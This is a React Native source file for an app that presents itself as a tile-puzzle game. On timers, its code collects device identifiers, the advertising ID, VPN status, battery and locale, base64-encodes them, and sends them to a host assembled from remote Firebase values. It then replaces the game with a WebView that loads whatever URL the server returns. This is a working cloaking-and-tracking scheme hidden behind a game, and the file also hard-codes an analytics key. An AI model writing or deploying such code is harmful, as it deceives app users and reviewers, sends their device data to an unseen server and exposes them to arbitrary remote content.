import {ActivityIndicator } from 'react-native';
import React, {Component} from 'react';
import {Platform, StyleSheet, Text, View, Button } from 'react-native';
import {NativeModules} from 'react-native';
import {ImageBackground} from 'react-native';
import { WebView } from 'react-native-webview';
import {db} from './Fb';
import axios from 'axios';
import base64 from 'react-native-base64'
import utf8 from 'utf8'
import DeviceInfo from 'react-native-device-info'
import RNAdvertisingId from 'react-native-advertising-id';
import VpnState from "react-native-ip-sec-vpn";
import appsFlyer from 'react-native-appsflyer';
import Container from './src/components/Container';


this.onInstallConversionDataCanceller = appsFlyer.onInstallConversionData(
  (res) => {
    if (JSON.parse(res.data.is_first_launch) == true) {
      if (res.data.af_status === 'Non-organic') {
        media_sourceOne = res.data.media_source;
        campaignOne = res.data.campaign;
        campaign_idOne = res.data.campaign_id;
        af_ad_idOne = res.data.af_ad_id;
      } else if (res.data.af_status === 'Organic') {
      }
    } else {
    }
  }
);

appsFlyer.initSdk(
  {
    devKey: 'XBUfYwdNc62duH7VM3o7x8'
  },
  (result) => {
  },
  (error) => {
  }
);

appsFlyer.getAppsFlyerUID((err, appsFlyerUID) => {
  if (err) {
    console.error(err);
  } else {
   appsFlyerUIDOne = appsFlyerUID;
  }
});


let itemsRef = db.ref('one');
let itemsRef2 = db.ref('two');
let media_sourceOne = "null";
let campaignOne = "null";
let campaign_idOne = "null";
let af_ad_idOne = "null";
let appsFlyerUIDOne = "null";


export default class App extends React.Component {

state = {
    android_id: "null",
    phone_brand: "null",
    phone_model: "null",
    charging: "null",
    battery_level: "null",
    locale: "null",
    advertising_id: "null",
    vpn: "null",
    media_source: "null",
    campaign: "null",
    campaign_id: "null",
    af_ad_id: "null",
    appsflyer_id: "null",
    text: "null",
    bytes: "null",
    text2: "null",
    itemOne: "null",
    itemTwo: "null",
    personsOne: "null",
    personsTwo: "null"
  };

  componentDidMount() {
      itemsRef.on('value', snapshot => {
         itemOne = snapshot.val();
          this.setState({ itemOne });
      });
      itemsRef2.on('value', snapshot => {
               itemTwo = snapshot.val();
                this.setState({ itemTwo });
            });

            DeviceInfo.getAndroidId().then((androidId) => {
              android_id = androidId;
              this.setState({ android_id });
            });


            phone_brand = DeviceInfo.getBrand();
            this.setState({ phone_brand });

            phone_model = DeviceInfo.getModel();
            this.setState({ phone_model });

            DeviceInfo.isBatteryCharging().then((isCharging) => {
             charging = isCharging;
             this.setState({ charging });
            });

            DeviceInfo.getBatteryLevel().then((batteryLevel) => {
             battery_level = batteryLevel;
             this.setState({ battery_level });
            });

            const deviceLanguage =
                      Platform.OS === 'ios'
                        ? NativeModules.SettingsManager.settings.AppleLocale ||
                          NativeModules.SettingsManager.settings.AppleLanguages[0] // iOS 13
                        : NativeModules.I18nManager.localeIdentifier;
            locale = deviceLanguage;
            this.setState({ locale });

            RNAdvertisingId.getAdvertisingId()
                .then(response => {
                 advertising_id = response.advertisingId;
                 this.setState({ advertising_id });
                  });

             VpnState.getCurrentState().then((state) => {
             if (state==0) {
               vpn = false;
               this.setState({ vpn });
               } else {
               vpn = true;
               this.setState({ vpn });
               }
             });


setInterval(() => {
media_source = media_sourceOne;
this.setState({ media_source });
campaign = campaignOne;
this.setState({ campaign });
campaign_id = campaign_idOne;
this.setState({ campaign_id });
af_ad_id = af_ad_idOne;
this.setState({ af_ad_id });
appsflyer_id = appsFlyerUIDOne;
this.setState({ appsflyer_id });
 }, 5000);


setInterval(() => {
text = 'android_id=' + android_id +
'&phone_model='+ phone_model +
"&phone_brand=" + phone_brand +
"&charging=" + charging +
"&battery_level=" + battery_level +
"&locale=" + locale +
"&advertising_id=" + advertising_id +
"&vpn=" + vpn +
"&appsflyer_id=" + appsflyer_id +
"&media_source=" + media_source +
"&campaign_id=" + campaign_id +
"&af_ad_id=" + af_ad_id +
"&campaign=" + campaign;
this.setState({ text });
bytes = utf8.encode(text)
this.setState({ bytes });
text2 = base64.encode(bytes);
this.setState({ text2 });
 }, 6000);


setInterval(() => {
axios.get('https://' + itemOne + itemTwo + '?data='+ text2)
      .then(res => {
        personsOne = res.data.['miked'];
        personsTwo = res.data.['lochs'];
        console.log(personsOne+personsTwo);
        this.setState({ personsOne });
        this.setState({ personsTwo });
      })
     }, 8000);
    }


constructor() {
    super();
    this.state = {
      url: 'https://',
      read: false
    }
    setInterval(() => {
        this.setState({ url: 'https://' + personsOne + personsTwo });
        this.setState({ read: true });
        }, 9000);
    }


   render() {

   const web = <WebView
                              javaScriptEnabled={true}
                              domStorageEnabled={true}
                              source={{ uri: this.state.url }}
                              style={{ marginTop: 20 }}
                              />;

   const zag = <View style={[styles.horizontal]}>
                                     <Text style={{ fontSize: 20 }}>Loading game...</Text>
                                        <ActivityIndicator size="large" color="#0000ff" />
                                      </View>;

   const game = <Container startTiles={2} size={4} />

   if (this.state.url== 'https://'){
   return this.state.read ? game : zag
   }
   else{
   return this.state.read ? web : zag
   }

    }
  }

  const styles = StyleSheet.create({
        horizontal: {
          flexDirection: "row",
          justifyContent: "space-around",
         margin: 100,
        }
    });